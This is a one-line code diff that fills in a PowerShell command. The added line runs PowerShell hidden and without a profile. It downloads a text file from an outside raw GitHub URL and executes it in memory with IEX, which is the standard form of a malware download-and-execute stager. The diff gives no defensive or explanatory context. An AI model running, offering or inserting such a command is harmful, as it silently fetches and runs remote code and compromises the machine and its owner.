@@ -1,1 +1,1 @@
-powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http:'))""
+powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/zxt666oz/data_report/master/data_ps_pl.txt'))""
